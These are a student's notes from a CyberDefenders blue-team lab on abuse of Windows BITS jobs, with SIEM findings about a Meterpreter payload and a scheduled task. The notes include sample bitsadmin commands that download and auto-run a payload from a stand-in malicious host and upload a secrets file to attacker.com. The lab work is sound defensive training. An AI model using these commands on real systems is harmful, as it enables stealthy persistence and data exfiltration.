T1197 Lab (CyberDefenders)

Hello these are my notes taken while solving the lab, not a polished writeup. I was practicing for the ECIR exam at the time and plan to revisit the lab to add screenshots and turn this into a full write-up in the future.

Scenario

Adversaries can exploit BITS (Background Intelligent Transfer Service) jobs to persistently execute code and carry out various background tasks. BITS is a COM-exposed, low-bandwidth file transfer mechanism used by applications such as updaters and messengers, allowing them to operate in the background without interfering with other networked applications.

In this incident, an employee received multiple alerts from Windows Defender indicating the presence of malicious files on their PC. As you arrive at the scene, your goal is to use SIEM to analyze the event logs from the suspicious machine and determine the nature of the events.

https://cyberdefenders.org/blueteam-ctf-challenges/t1197/

Preliminary Search

Before starting the detailed investigation, I reviewed the fundamentals of BITS.

BITS Overview

Background Intelligent Transfer Service (BITS) is a Windows component used to transfer files asynchronously between a client and a server. It is commonly used for Windows updates, software installations, and other background file transfers. BITS operates as a system service and is designed to handle network interruptions gracefully, resuming transfers where they left off.

How Attackers Abuse BITS for Persistence

Attackers create malicious download or upload tasks that automatically execute their payloads. Since BITS jobs can be scheduled and operate in the background, they provide a stealthy way for adversaries to maintain access to compromised systems.

Attack Methods

  1. Creating a Malicious BITS Job
    • Attackers create a BITS job to download a payload.
    • Example:

``powershell bitsadmin /create backdoorjob bitsadmin /addfile backdoorjob http://malicious-site.com/payload.exe C:\Windows\Temp\payload.exe bitsadmin /resume backdoorjob ``

  1. Executing the Payload via BITS Notification Commands
    • BITS can automatically execute the payload after downloading.
    • Example:

``powershell bitsadmin /SetNotifyCmdLine backdoorjob C:\Windows\Temp\payload.exe NULL ``

  1. Using BITS to Schedule Recurrent Execution
    • Attackers use hidden BITS jobs to maintain persistence.
    • BITS jobs survive reboots and execute automatically.
  2. Uploading Stolen Data via BITS
    • Attackers use BITS to exfiltrate sensitive files.
    • Example:

``powershell bitsadmin /addfile uploadjob C:\Users\Victim\Documents\secrets.txt http://attacker.com/upload bitsadmin /resume uploadjob ``

  1. Evading Detection
    • BITS jobs run under svchost.exe, making them blend in.
    • Attackers delete history to remove traces.
    • Example:

``powershell bitsadmin /Complete backdoorjob ``

BITS-Specific Event IDs

Since this lab’s main focus was on BITS, the usual event IDs were not as prominent. Instead, the following BITS-specific event IDs were found:

  • Event ID 4 – A BITS transfer job was successfully completed.
  • Event ID 8 – A BITS transfer job was canceled or aborted.
  • Event ID 16 – A BITS job was successfully paused.
  • Event ID 32 – BITS transfer is in progress or was successfully restarted.
  • Event ID 35 – BITS transfer failed due to a network-related issue or other transfer errors.
  • Event ID 59 – BITS transfer failure, typically due to network or permission issues.
  • Event ID 60 – BITS or security policy setting changes, often related to configuration modifications.

Detailed Analysis

Event Code 4688 – New Process Created

  • Found the process “bitsadmin.exe”.
  • Although bitsadmin.exe is a legitimate Windows utility, the attacker used it as a LOLBAS (Living Off the Land Binary).
  • Determining Malicious Behavior:

If the process were legitimate, its expected parent process would be a system service or scheduled task. However, it was found that PowerShell is its parent process, which is highly suspicious 💀.

Event Code 3 – Network Connection

  • No significant findings were discovered in event code 3

Event Codes 59 & 60 – BITS Activity

  • The attacker used BITS to download files. Additionally, an IP address was identified:

“192.168.190.136”

  • Files Downloaded:
    • File 1: R4n50m.exe from http://192.168.190.136/R4n50m.exe
    • File 2: test.exe from http://192.168.190.136/test.exe
    • File 3: test.exe from http://192.168.190.136/test.exe
  • The attacker used BITS to download these files to evade detection.
  • Querying for R4n50m.exe revealed that Microsoft Antivirus detected it as Trojan:Win32/Meterpreter.O.

Scheduled Task and Additional Malware Discovery

  • Scheduled Task Created (Event Code 4698):
    • Task Name: “eviltask”
    • Registered by the user: MSEDGEWIN10\IEUser
    • The task triggers every minute.
    • The task will run the command: C:\shell.cmd
  • Additional Windows Defender Alert (Event Code 1116):
    • Malware was located at: C:\ignite.png
    • Detected as: Trojan:Win32/Meterpreter.O!MTB.
